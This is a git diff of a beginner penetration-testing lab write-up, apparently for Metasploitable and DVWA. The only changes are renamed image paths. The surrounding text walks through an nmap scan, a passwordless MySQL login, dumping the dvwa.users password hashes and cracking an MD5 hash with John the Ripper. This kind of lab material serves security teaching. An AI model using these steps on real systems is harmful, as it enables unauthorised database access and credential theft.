@@ -1,4 +1,4 @@
-![alt text](img/banner.png)
+![alt text](evidence/banner.png)
 ---
 # 🎓 **Lab 2 — Beginner Edition: Hack the Database Like a Pro (Safely!)**
 
@@ -81,7 +81,7 @@ Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: U
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 35.29 seconds
 ```
-![alt text](img/image.png)
+![alt text](evidence/image.png)
 
 ---
 
@@ -116,7 +116,7 @@ WARNING: option --ssl-verify-server-cert is disabled, because of an insecure pas
 
 ERROR 2026 (HY000): TLS/SSL error: wrong version number
 ```
-![alt text](img/image-1.png)
+![alt text](evidence/image-1.png)
 
 ### 📋 1.3 Try Without SSL or Password
 
@@ -153,7 +153,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 MySQL [(none)]>
 ```
-![alt text](img/image-3.png)
+![alt text](evidence/image-3.png)
 
 ---
 
@@ -189,7 +189,7 @@ MySQL [(none)]> SHOW DATABASES;
 +--------------------+
 7 rows in set (0.001 sec)
 ```
-![alt text](img/image-4.png)
+![alt text](evidence/image-4.png)
 
 ### 📂 2.2 Use One Database
 
@@ -205,7 +205,7 @@ You can turn off this feature to get a quicker startup with -A
 
 Database changed
 ```
-![alt text](img/image-6.png)
+![alt text](evidence/image-6.png)
 
 ### 📑 2.3 Show Tables
 
@@ -229,7 +229,7 @@ MySQL [dvwa]> SHOW TABLES;
 +----------------+
 2 rows in set (0.001 sec)
 ```
-![alt text](img/image-7.png)
+![alt text](evidence/image-7.png)
 
 ### 👥 2.4 Check Users Table
 
@@ -263,7 +263,7 @@ SELECT user, password FROM dvwa.users;
 +---------+----------------------------------+
 5 rows in set (0.000 sec)
 ```
-![alt text](img/image-8.png)
+![alt text](evidence/image-8.png)
 
 ---
 
@@ -316,7 +316,7 @@ Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
 [+] DNSSEC(NSEC3)
 [+] RAdmin v2.x
 ```
-![alt text](img/image-10.png)
+![alt text](evidence/image-10.png)
 
 ```
 hash-identifier
@@ -386,7 +386,7 @@ Least Possible Hashs:
 [+] md5(sha1(md5(sha1($pass))))
 [+] md5(strtoupper(md5($pass)))
 ```
-![alt text](img/image-11.png)
+![alt text](evidence/image-11.png)
 
 - Paste the hash into the tool and see what it says. In my case, it detected **MD5**, which suggests the app or system is using a custom or non-default hashing method — **not MySQL’s built-in ones like `MySQL323` or `MySQLSHA1`**.
 - Paste the hash into a tool like **Hash-Identifier** or **CrackStation** to detect its type.
@@ -419,7 +419,7 @@ echo "[hash]" > hashes.txt
 ```sh
 echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt 
 ```
-![alt text](img/image-12.png)
+![alt text](evidence/image-12.png)
 
 ### 🔓 4.2 Crack with John
 
@@ -448,7 +448,7 @@ password         (?)     👈
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed. 
 ```
-![alt text](img/image-14.png)
+![alt text](evidence/image-14.png)
 
 ### 🔍 4.3 Show Cracked Passwords
 
@@ -470,7 +470,7 @@ john --show --format=raw-md5 hashes.txt
 
 1 password hash cracked, 0 left
 ```
-![alt text](img/image-13.png)
+![alt text](evidence/image-13.png)
 
 ---
 
